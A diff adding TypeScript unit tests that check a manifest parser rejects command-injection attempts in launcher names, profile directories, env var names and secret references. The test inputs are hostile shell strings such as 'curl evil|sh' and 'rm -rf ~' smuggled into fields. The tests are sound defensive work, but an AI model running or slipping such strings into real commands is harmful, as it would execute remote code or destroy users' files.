@@ -30,4 +30,27 @@ describe('manifest', () => {
     await saveManifest(root, sample)
     expect(await loadManifest(root)).toEqual(sample)
   })
+
+  describe('injection safety (untrusted manifests)', () => {
+    const withProfile = (patch: Record<string, unknown>) => serializeManifest({
+      ...sample,
+      profiles: [{ ...sample.profiles[0], ...patch }],
+    } as any)
+
+    it('rejects a launcher name with shell metacharacters', () => {
+      expect(() => parseManifest(withProfile({ launcher: 'x; curl evil|sh' }))).toThrow(/unsafe launcher/)
+    })
+    it('rejects a profile dir that could break the quoted context', () => {
+      expect(() => parseManifest(withProfile({ dir: '{home}/.claude"; rm -rf ~ #' }))).toThrow(/unsafe profile dir/)
+    })
+    it('rejects an env var name that is not a valid identifier', () => {
+      expect(() => parseManifest(withProfile({ env: { 'X; evil': 'v' } }))).toThrow(/unsafe env var/)
+    })
+    it('rejects a secret reference with injection characters', () => {
+      expect(() => parseManifest(withProfile({ env: { TOKEN: 'secret://a); curl evil|sh #' } }))).toThrow(/unsafe secret reference/)
+    })
+    it('accepts a normal profile', () => {
+      expect(() => parseManifest(withProfile({ launcher: 'cl-work', env: { TOKEN: 'secret://z-token' } }))).not.toThrow()
+    })
+  })
 })
